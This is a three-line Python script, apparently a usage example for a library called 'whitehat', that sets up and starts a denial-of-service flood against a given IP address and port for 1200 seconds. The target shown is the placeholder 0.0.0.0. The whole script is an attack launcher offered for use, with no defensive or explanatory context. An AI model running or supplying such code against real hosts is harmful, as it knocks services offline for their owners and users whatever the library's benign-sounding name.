import whitehat

ddos = whitehat.ddos.target("0.0.0.0", 80, 1200)  #IP, PORT, DURATION
whitehat.ddos.start(ddos)
